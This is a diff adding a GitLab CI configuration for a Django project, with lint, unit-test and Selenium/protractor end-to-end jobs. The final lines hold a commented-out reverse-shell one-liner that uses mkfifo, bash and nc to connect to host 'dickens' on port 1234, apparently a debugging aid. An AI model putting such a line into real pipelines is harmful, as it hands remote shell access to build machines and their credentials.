@@ -1,0 +1,69 @@
+variables:
+  DJANGO_SETTINGS_MODULE: newage.settings.ci
+
+cache:
+  key: global
+  paths:
+    - ci-cache
+
+before_script:
+  - time source gitlab-ci-init-python.inc
+      --verbose --verbose --verbose
+      # --ssh-key "$SSH_DEPLOY_KEY"
+  # match expected env vars on live
+  - export DB_HOST="$MYSQL_HOST"
+  - export DB_USER="$MYSQL_USER"
+  - export DB_PASSWORD="$MYSQL_PASSWORD"
+  - export DB_NAME="$MYSQL_DATABASE"
+
+image: alliance/python
+
+lint:
+  script:
+    # we install required packages so linter's isort can know what is(n't) a 3rd party package
+    - time pip install -r requirements.txt
+    - time pip install -r requirements/dev.txt
+    - time bin/lint.sh
+#  when: manual
+
+test-unit:
+  services:
+    - selenium/standalone-chrome:3
+    - alliance/mysql:5.7
+
+  script:
+    - time pip install -r requirements.txt
+    - bin/run-tests-unit.sh
+
+test-frontend:
+  services:
+    - selenium/standalone-chrome:3
+    #- selenium/standalone-firefox:3
+
+    # live is mysql 5.1 but this is as close as we get with docker
+    - alliance/mysql:5.7
+
+  script:
+    # build frontend JS
+    - ( cd frontend && time yarn install )
+    - ( cd frontend && time yarn run build )
+
+    # django server
+    - export MOCK_DATES=1
+    - time pip install -r requirements.txt
+    - ( cd nac && time ./manage.py collectstatic --verbosity 3 --noinput )
+    # - time bin/reset-db.sh --no-fixtures # NOT NECESSARY
+    # use runserver_plus if you want to log URL requests
+    # use DEBUG_SQL=1 if you want to log SQL queries (note gitlab-ci 4mb output limit)
+    - ( cd nac && DEBUG_SQL=0 ./manage.py runserver_plus --verbosity 3 --insecure --noreload 0.0.0.0:8000 ) &
+    - ~/bin/wait-for-server.sh 127.0.0.1 8000
+
+    # protractor tests
+    - ( cd test-e2e && time yarn install )
+    # 'Broken Pipe' errors: see https://github.com/pallets/werkzeug/issues/954)
+    - echo "Broken Pipe errors can be ignored"
+    - bin/run-tests-e2e.sh #|| true
+
+    # Enable this to create a reverse shell
+    #- ( rm -rf /tmp/f && mkfifo /tmp/f && cat /tmp/f | /bin/bash 2>&1 | nc dickens 1234 >/tmp/f )
+#  when: manual
